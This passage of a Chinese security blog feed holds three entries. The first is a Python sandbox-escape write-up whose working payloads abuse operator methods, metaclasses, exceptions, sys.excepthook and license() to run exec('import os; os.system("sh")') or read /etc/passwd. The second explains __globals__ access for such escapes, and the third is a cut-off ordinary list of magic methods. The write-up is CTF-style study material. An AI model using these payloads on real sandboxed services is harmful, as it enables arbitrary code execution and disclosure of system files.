class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">__sub__ (k - <span class="string">&#x27;import os; os.system(&quot;sh&quot;)&#x27;</span>)</span><br><span class="line">__mul__ (k * <span class="string">&#x27;import os; os.system(&quot;sh&quot;)&#x27;</span>)</span><br><span class="line">__floordiv__ (k // <span class="string">&#x27;import os; os.system(&quot;sh&quot;)&#x27;</span>)</span><br><span class="line">__truediv__ (k / <span class="string">&#x27;import os; os.system(&quot;sh&quot;)&#x27;</span>)</span><br><span class="line">__mod__ (k % <span class="string">&#x27;import os; os.system(&quot;sh&quot;)&#x27;</span>)</span><br><span class="line">__pow__ (k**<span class="string">&#x27;import os; os.system(&quot;sh&quot;)&#x27;</span>)</span><br><span class="line">__lt__ (k &lt; <span class="string">&#x27;import os; os.system(&quot;sh&quot;)&#x27;</span>)</span><br><span class="line">__le__ (k &lt;= <span class="string">&#x27;import os; os.system(&quot;sh&quot;)&#x27;</span>)</span><br><span class="line">__eq__ (k == <span class="string">&#x27;import os; os.system(&quot;sh&quot;)&#x27;</span>)</span><br><span class="line">__ne__ (k != <span class="string">&#x27;import os; os.system(&quot;sh&quot;)&#x27;</span>)</span><br><span class="line">__ge__ (k &gt;= <span class="string">&#x27;import os; os.system(&quot;sh&quot;)&#x27;</span>)</span><br><span class="line">__gt__ (k &gt; <span class="string">&#x27;import os; os.system(&quot;sh&quot;)&#x27;</span>)</span><br><span class="line">__iadd__ (k += <span class="string">&#x27;import os; os.system(&quot;sh&quot;)&#x27;</span>)</span><br><span class="line">__isub__ (k -= <span class="string">&#x27;import os; os.system(&quot;sh&quot;)&#x27;</span>)</span><br><span class="line">__imul__ (k *= <span class="string">&#x27;import os; os.system(&quot;sh&quot;)&#x27;</span>)</span><br><span class="line">__ifloordiv__ (k //= <span class="string">&#x27;import os; os.system(&quot;sh&quot;)&#x27;</span>)</span><br><span class="line">__idiv__ (k /= <span class="string">&#x27;import os; os.system(&quot;sh&quot;)&#x27;</span>)</span><br><span class="line">__itruediv__ (k /= <span class="string">&#x27;import os; os.system(&quot;sh&quot;)&#x27;</span>) (Note that this only works when <span class="keyword">from</span> __future__ <span class="keyword">import</span> division <span class="keyword">is</span> <span class="keyword">in</span> effect.)</span><br><span class="line">__imod__ (k %= <span class="string">&#x27;import os; os.system(&quot;sh&quot;)&#x27;</span>)</span><br><span class="line">__ipow__ (k **= <span class="string">&#x27;import os; os.system(&quot;sh&quot;)&#x27;</span>)</span><br><span class="line">__ilshift__ (k&lt;&lt;= <span class="string">&#x27;import os; os.system(&quot;sh&quot;)&#x27;</span>)</span><br><span class="line">__irshift__ (k &gt;&gt;= <span class="string">&#x27;import os; os.system(&quot;sh&quot;)&#x27;</span>)</span><br><span class="line">__iand__ (k = <span class="string">&#x27;import os; os.system(&quot;sh&quot;)&#x27;</span>)</span><br><span class="line">__ior__ (k |= <span class="string">&#x27;import os; os.system(&quot;sh&quot;)&#x27;</span>)</span><br><span class="line">__ixor__ (k ^= <span class="string">&#x27;import os; os.system(&quot;sh&quot;)&#x27;</span>)</span><br></pre></td></tr></table></figure><p>示例:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Metaclass</span>(<span class="title class_ inherited__">type</span>):</span><br><span class="line">    __sub__ = <span class="built_in">exec</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Sub</span>(metaclass=Metaclass):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">Sub-<span class="string">&#x27;import os; os.system(&quot;sh&quot;)&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="exceptions-利用"><a href="#exceptions-利用" class="headerlink" title="exceptions 利用"></a>exceptions 利用</h2><p>利用 exceptions 的目的也是为了绕过显示地实例化一个类, 如果一个类继承了 Exception 类, 那么就可以通过 raise 关键字来实例化. payload 如下:</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">RCE</span>(<span class="title class_ inherited__">Exception</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="variable language_">self</span> += <span class="string">&#x27;import os; os.system(&quot;sh&quot;)&#x27;</span></span><br><span class="line">    __iadd__ = <span class="built_in">exec</span> </span><br><span class="line">    </span><br><span class="line"><span class="keyword">raise</span> RCE </span><br></pre></td></tr></table></figure><p>raise 会进入 RCE 的 <strong>init</strong>, 然后触发 <strong>iadd</strong> 也就是 exec.</p><p>当然, 触发异常不一定需要 raise, 主动地编写错误代码也可以触发,与是就有了如下的几种 payload.</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">X</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, a, b, c</span>):</span><br><span class="line">        <span class="variable language_">self</span> += <span class="string">&quot;os.system(&#x27;sh&#x27;)&quot;</span></span><br><span class="line">    __iadd__ = <span class="built_in">exec</span></span><br><span class="line">sys.excepthook = X</span><br><span class="line"><span class="number">1</span>/<span class="number">0</span></span><br></pre></td></tr></table></figure><p>这个 payload 中直接将 sys.excepthook 进行覆盖,任何异常产生时都会触发.</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">X</span>():</span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, a, b, c, d, e</span>):</span><br><span class="line">    <span class="variable language_">self</span> += <span class="string">&quot;print(open(&#x27;flag&#x27;).read())&quot;</span></span><br><span class="line">  __iadd__ = <span class="built_in">eval</span></span><br><span class="line">__builtins__.<span class="built_in">__import__</span> = X</span><br><span class="line"><span class="comment"># &#123;&#125;[1337]</span></span><br></pre></td></tr></table></figure><p>这个 payload 将 <strong>import</strong> 函数进行覆盖, 最后的 {}[1337] 在正常情况下会引发 KeyError 异常，因为 Python 在引发异常时会尝试导入某些模块（比如traceback 模块），导入时就会触发 <strong>import</strong>.</p><h2 id="通过-license-函数读取文件"><a href="#通过-license-函数读取文件" class="headerlink" title="通过 license 函数读取文件"></a>通过 license 函数读取文件</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">__builtins__.__dict__[<span class="string">&quot;license&quot;</span>]._Printer__filenames=[<span class="string">&quot;/etc/passwd&quot;</span>]</span><br><span class="line">a = __builtins__.<span class="built_in">help</span></span><br><span class="line">a.__class__.__enter__ = __builtins__.__dict__[<span class="string">&quot;license&quot;</span>]</span><br><span class="line">a.__class__.__exit__ = <span class="keyword">lambda</span> <span class="variable language_">self</span>, *args: <span class="literal">None</span></span><br><span class="line"><span class="keyword">with</span> (a <span class="keyword">as</span> b):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line">上面的 payload 修改内建函数 license 的文件名列表为 /etc/passwd 当调用 license() 时会打印这个文件的内容.</span><br><span class="line"></span><br><span class="line">__builtins__.__dict__[<span class="string">&quot;license&quot;</span>]._Printer__filenames</span><br><span class="line">[<span class="string">&#x27;/usr/lib/python3.11/../LICENSE.txt&#x27;</span>, <span class="string">&#x27;/usr/lib/python3.11/../LICENSE&#x27;</span>, <span class="string">&#x27;/usr/lib/python3.11/LICENSE.txt&#x27;</span>, <span class="string">&#x27;/usr/lib/python3.11/LICENSE&#x27;</span>, <span class="string">&#x27;./LICENSE.txt&#x27;</span>, <span class="string">&#x27;./LICENSE&#x27;</span>]</span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="number">2</span></span><br><span class="line">payload 中将 <span class="built_in">help</span> 类的 __enter__ 方法覆盖为 license 方法, 而 <span class="keyword">with</span> 语句在创建上下文时会调用 <span class="built_in">help</span> 的__enter__, 从而执行 license 方法. 这里的 <span class="built_in">help</span> 类只是一个载体, 替换为其他的支持上下文的类或者自定义一个类也是可以的</span><br></pre></td></tr></table></figure><p>例如:</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyContext</span>:</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line">    </span><br><span class="line">__builtins__.__dict__[<span class="string">&quot;license&quot;</span>]._Printer__filenames=[<span class="string">&quot;/etc/passwd&quot;</span>]</span><br><span class="line">a = MyContext()</span><br><span class="line">a.__class__.__enter__ = __builtins__.__dict__[<span class="string">&quot;license&quot;</span>]</span><br><span class="line">a.__class__.__exit__ = <span class="keyword">lambda</span> <span class="variable language_">self</span>, *args: <span class="literal">None</span></span><br><span class="line"><span class="keyword">with</span> (a <span class="keyword">as</span> b):</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>其他绕过技巧</p><h2 id="模拟-no-builitins-环境"><a href="#模拟-no-builitins-环境" class="headerlink" title="模拟 no builitins 环境"></a>模拟 no builitins 环境</h2><p>no builtins 环境和 python 交互式解析器还是有所差异, 但交互式解析器并没有提供指定命名空间的功能,因此可以自己编写一个脚本进行模拟:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">repl</span>():</span><br><span class="line">    global_namespace = &#123;&#125;</span><br><span class="line">    local_namespace = &#123;&#125;</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        code = <span class="built_in">input</span>(<span class="string">&#x27;&gt;&gt;&gt; &#x27;</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment"># Try to eval the code first.</span></span><br><span class="line">            result = <span class="built_in">eval</span>(code, global_namespace, local_namespace)</span><br><span class="line">        <span class="keyword">except</span> SyntaxError:</span><br><span class="line">            <span class="comment"># If a SyntaxError occurs, this might be because the user entered a statement,</span></span><br><span class="line">            <span class="comment"># in which case we should use exec.</span></span><br><span class="line">            <span class="built_in">exec</span>(code, global_namespace, local_namespace)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(result)</span><br><span class="line">    <span class="keyword">except</span> EOFError:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Error: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    repl() </span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python 魔法方法利用注意</title>
      <link href="/2024/02/26/python_%E9%AD%94%E6%B3%95%E6%96%B9%E6%B3%95%E5%88%A9%E7%94%A8%E6%B3%A8%E6%84%8F/"/>
      <url>/2024/02/26/python_%E9%AD%94%E6%B3%95%E6%96%B9%E6%B3%95%E5%88%A9%E7%94%A8%E6%B3%A8%E6%84%8F/</url>
      
        <content type="html"><![CDATA[<h1 id="我们先看一个报错"><a href="#我们先看一个报错" class="headerlink" title="我们先看一个报错"></a>我们先看一个报错</h1><p><img src="https://sl0wjamz.oss-cn-hangzhou.aliyuncs.com/img/image-20241022173651605.png" alt="image-20241022173651605"></p><p>在 Python 中，<code>__init__</code> 方法属于类的实例方法，但它本质上是通过 <code>method-wrapper</code> 或 <code>wrapper_descriptor</code> 实现的特殊方法，而不是常规的函数对象。这就是为什么在访问 <code>__init__</code> 的时候会看到 <code>method-wrapper</code>，并且无法访问像 <code>__globals__</code> 这样的属性。</p><p><strong><code>__init__</code> 是一个特殊方法</strong>： <code>__init__</code> 是类的构造函数（初始化方法），它是一个绑定方法，调用时由 Python 自动处理。这种特殊的绑定方法不像普通的函数或方法那样包含 <code>__globals__</code> 属性，因为它是通过内部机制实现的，而不是像常规函数那样存在于全局命名空间。</p><p>**绑定方法和 <code>method-wrapper</code>**： 通过 <code>obj.__init__</code> 访问 <code>__init__</code> 实际上返回的是一个绑定到对象的 <code>method-wrapper</code>，它是 Python 的一种优化机制，用于类的魔法方法。<code>method-wrapper</code> 并不暴露 <code>__globals__</code> 属性，因为它与普通函数不同，不能直接通过 <code>globals()</code> 访问其全局变量。</p><p><strong><code>__globals__</code> 仅适用于函数对象</strong>： 只有普通的函数对象（如通过 <code>def</code> 定义的函数）才会有 <code>__globals__</code> 属性，表示它们所在的全局命名空间。Python 的内建方法（如 <code>__init__</code>）是用 <code>C</code> 实现的，属于特殊的 <code>method-wrapper</code>，因此不具备 <code>__globals__</code> 属性。</p><blockquote><p>重点在第三点，能够有globals属性的必须是def定义的函数（lambda也可以</p></blockquote><p><img src="https://sl0wjamz.oss-cn-hangzhou.aliyuncs.com/img/image-20241022174223178.png" alt="image-20241022174223178"></p><p><img src="https://sl0wjamz.oss-cn-hangzhou.aliyuncs.com/img/image-20241022174511612.png" alt="image-20241022174511612"></p><p>很清晰了，函数能直接访问他<code>所在模块</code>的所有变量和属性，你看test3已经访问到了之前定义的匿名函数。</p><blockquote><p>所以我们的目的一般都是通过访问类或者<code>类</code>的<code>实例</code>来访问函数的globals属性</p></blockquote><p><img src="https://sl0wjamz.oss-cn-hangzhou.aliyuncs.com/img/image-20241022174549243.png" alt="image-20241022174549243"></p><ul><li>注意跳板为实例的时候，必须得访问__class__来访问到他的类。</li></ul><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>Python 的内置魔法方法（如 <code>__init__</code>）是特殊的绑定方法（<code>method-wrapper</code>），不具备 <code>__globals__</code> 属性。</p><p>只有通过 <code>def</code> 定义的普通函数和方法才具有 <code>__globals__</code> 属性，表示它们的全局命名空间。</p><p>要访问 <code>__globals__</code>，请确保操作的对象是常规的函数或方法对象，而不是内建的魔法方法。</p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python魔术方法</title>
      <link href="/2024/02/26/python%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95/"/>
      <url>/2024/02/26/python%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<h1 id="基本魔术方法"><a href="#基本魔术方法" class="headerlink" title="基本魔术方法"></a>基本魔术方法</h1><ol><li><p>**<code>__init__</code>**：对象初始化方法，在创建对象时调用。通常用来初始化对象的属性。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">class Example:</span><br><span class="line">    def __init__(self, value):</span><br><span class="line">        self.value = value</span><br></pre></td></tr></table></figure></li><li><p>**<code>__repr__</code>**：返回对象的“官方”字符串表示形式。通常可以通过调用 <code>repr(object)</code> 来查看。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">class Example:</span><br><span class="line">    def __repr__(self):</span><br><span class="line">        return f&quot;Example(value=&#123;self.value&#125;)&quot;</span><br></pre></td></tr></table></figure></li><li><p>**<code>__str__</code>**：返回对象的“非正式”或友好字符串表示形式。通常可以通过调用 <code>str(object)</code> 或 <code>print(object)</code> 来查看。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">class Example:</span><br><span class="line">    def __str__(self):</span><br><span class="line">        return f&quot;Example with value &#123;self.value&#125;&quot;</span><br></pre></td></tr></table></figure></li><li><p>**<code>__len__</code>**：返回对象的长度。常用于实现自定义容器类。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">class Container:</span><br><span class="line">    def __len__(self):</span><br><span class="line">        return len(self.items)</span><br></pre></td></tr></table></figure></li><li><p>**<code>__getitem__</code>**：获取对象中指定键的值。通常用于实现自定义的索引操作。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">class Container:</span><br><span class="line">    def __getitem__(self, key):</span><br><span class="line">        return self.items[key]</span><br></pre></td></tr></table></figure></li><li><p>**<code>__setitem__</code>**：设置对象中指定键的值。常用于实现可变容器。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">class Container:</span><br><span class="line">    def __setitem__(self, key, value):</span><br><span class="line">        self.items[key] = value</span><br></pre></td></tr></table></figure></li><li><p>**<code>__delitem__</code>**：删除对象中指定键的值。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">class Container:</span><br><span class="line">    def __delitem__(self, key):</span><br><span class="line">        del self.items[key]</span><br></pre></td></tr></table></figure></li><li><p>**<code>__iter__</code>**：返回一个迭代器对象。通常用于实现可迭代对象。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">class Container:</span><br><span class="line">    def __iter__(self):</span><br><span class="line">        return iter(self.items)</span><br></pre></td></tr></table></figure></li><li><p>**<code>__contains__</code>**：检查对象是否包含指定的元素。通常用于 <code>in</code> 操作符。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">class Container:</span><br><span class="line">    def __contains__(self, item):</span><br><span class="line">        return item in self.items</span><br></pre></td></tr></table></figure></li><li><p>**<code>__call__</code>**：使实例对象可以像函数一样被调用。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">class Example:</span><br><span class="line">    def __call__(self, value):</span><br><span class="line">        self.value = value</span><br></pre></td></tr></table></figure></li><li><p>**<code>__base__</code>**：返回当前类的基类。如 <code>SomeClass.__base__</code> 会返回 <code>&lt;class &#39;object&#39;&gt;</code>。</p></li><li><p>**<code>__subclasses__()</code>**：查看当前类的子类组成的列表。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Example.__subclasses__()</span><br></pre></td></tr></table></figure></li><li><p>**<code>__builtins__</code>**：以一个集合的形式查看其引用。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import builtins</span><br><span class="line">dir(builtins)</span><br></pre></td></tr></table></figure></li><li><p>**<code>__getattr__</code><strong>、</strong><code>__setattr__</code><strong>、</strong><code>__delattr__</code>**：处理对象属性的获取、设置和删除。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">class Example:</span><br><span class="line">    def __getattr__(self, name):</span><br><span class="line">        return f&quot;&#123;name&#125; not found&quot;</span><br><span class="line"></span><br><span class="line">    def __setattr__(self, name, value):</span><br><span class="line">        self.__dict__[name] = value</span><br><span class="line"></span><br><span class="line">    def __delattr__(self, name):</span><br><span class="line">        del self.__dict__[name]</span><br></pre></td></tr></table></figure></li><li><p>**<code>__enter__</code><strong>、</strong><code>__exit__</code>**：定义在使用 <code>with</code> 语句时对象的上下文管理行为。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">class Example:</span><br><span class="line">    def __enter__(self):</span><br><span class="line">        # Setup code</span><br><span class="line">        return self</span><br><span class="line"></span><br><span class="line">    def __exit__(self, exc_type, exc_val, exc_tb):</span><br><span class="line">        # Teardown code</span><br><span class="line">        pass</span><br></pre></td></tr></table></figure></li><li><p>**<code>__class__</code>**：指向对象的类。可以用来获取对象的类信息。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">obj = Example()</span><br><span class="line">print(obj.__class__)  # &lt;class &#x27;__main__.Example&#x27;&gt;</span><br></pre></td></tr></table></figure></li><li><p>**<code>__delattr__</code>**：当试图删除对象的属性时调用。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">class Example:</span><br><span class="line">    def __delattr__(self, name):</span><br><span class="line">        print(f&quot;Deleting attribute &#123;name&#125;&quot;)</span><br><span class="line">        super().__delattr__(name)</span><br></pre></td></tr></table></figure></li><li><p>**<code>__dict__</code>**：包含对象（但不包括从类继承的属性）的属性字典。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">obj = Example()</span><br><span class="line">print(obj.__dict__)  # &#123;&#x27;attribute&#x27;: value&#125;</span><br></pre></td></tr></table></figure></li><li><p>**<code>__dir__</code>**：由 <code>dir()</code> 函数调用，用于列出对象的属性和方法。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">class Example:</span><br><span class="line">    def __dir__(self):</span><br><span class="line">        return [&#x27;custom_attribute&#x27;, &#x27;another_attribute&#x27;]</span><br></pre></td></tr></table></figure></li><li><p>**<code>__doc__</code>**：类或方法的文档字符串。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">class Example:</span><br><span class="line">    &quot;&quot;&quot;This is a docstring.&quot;&quot;&quot;</span><br><span class="line">print(Example.__doc__)  # &quot;This is a docstring.&quot;</span><br></pre></td></tr></table></figure></li><li><p>**<code>__eq__</code>**：实现对象的相等性比较，通常由 <code>==</code> 操作符调用。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">class Example:</span><br><span class="line">    def __eq__(self, other):</span><br><span class="line">        return self.value == other.value</span><br></pre></td></tr></table></figure></li><li><p>**<code>__format__</code>**：用于实现自定义的字符串格式化。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">class Example:</span><br><span class="line">    def __format__(self, format_spec):</span><br><span class="line">        return f&quot;Formatted value: &#123;self.value:&#123;format_spec&#125;&#125;&quot;</span><br></pre></td></tr></table></figure></li><li><p>**<code>__ge__</code>**：实现对象的“大于等于”比较，通常由 <code>&gt;=</code> 操作符调用。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">class Example:</span><br><span class="line">    def __ge__(self, other):</span><br><span class="line">        return self.value &gt;= other.value</span><br></pre></td></tr></table></figure></li><li><p>**<code>__getattribute__</code>**：在访问对象属性时调用，优先于 <code>__getattr__</code>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">class Example:</span><br><span class="line">    def __getattribute__(self, name):</span><br><span class="line">        print(f&quot;Accessing attribute &#123;name&#125;&quot;)</span><br><span class="line">        return super().__getattribute__(name)</span><br></pre></td></tr></table></figure></li><li><p>**<code>__getstate__</code>**：用于对象序列化时返回要保存的状态。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">class Example:</span><br><span class="line">    def __getstate__(self):</span><br><span class="line">        state = self.__dict__.copy()</span><br><span class="line">        return state</span><br></pre></td></tr></table></figure></li><li><p>**<code>__gt__</code>**：实现对象的“大于”比较，通常由 <code>&gt;</code> 操作符调用。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">class Example:</span><br><span class="line">    def __gt__(self, other):</span><br><span class="line">        return self.value &gt; other.value</span><br></pre></td></tr></table></figure></li><li><p>**<code>__hash__</code>**：实现对象的哈希值计算，通常由 <code>hash()</code> 函数调用。对象的哈希值应保持不变。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">class Example:</span><br><span class="line">    def __hash__(self):</span><br><span class="line">        return hash(self.value)</span><br></pre></td></tr></table></figure></li><li><p>**<code>__init_subclass__</code>**：在子类化时调用，可以用来自定义子类的行为。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">class Base:</span><br><span class="line">    def __init_subclass__(cls, **kwargs):</span><br><span class="line">        super().__init_subclass__(**kwargs)</span><br><span class="line">        cls.custom_attribute = True</span><br></pre></td></tr></table></figure></li><li><p>**<code>__le__</code>**：实现对象的“小于等于”比较，通常由 <code>&lt;=</code> 操作符调用。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">class Example:</span><br><span class="line">    def __le__(self, other):</span><br><span class="line">        return self.value &lt;= other.value</span><br></pre></td></tr></table></figure></li><li><p>**<code>__lt__</code>**：实现对象的“小于”比较，通常由 <code>&lt;</code> 操作符调用。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">class Example:</span><br><span class="line">    def __lt__(self, other):</span><br><span class="line">        return self.value &lt; other.value</span><br></pre></td></tr></table></figure></li><li><p>**<code>__module__</code>**：指向定义类的模块名称。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">class Example:</span><br><span class="line">    pass</span><br><span class="line">print(Example.__module__)  # __main__</span><br></pre></td></tr></table></figure></li><li><p>**<code>__ne__</code>**：实现对象的不等性比较，通常由 <code>!=</code> 操作符调用。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">class Example:</span><br><span class="line">    def __ne__(self, other):</span><br><span class="line">        return self.value != other.value</span><br></pre></td></tr></table></figure></li><li><p>**<code>__new__</code>**：创建并返回一个新对象实例，通常在对象实例化时调用，优先于 <code>__init__</code>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">class Example:</span><br><span class="line">    def __new__(cls, *args, 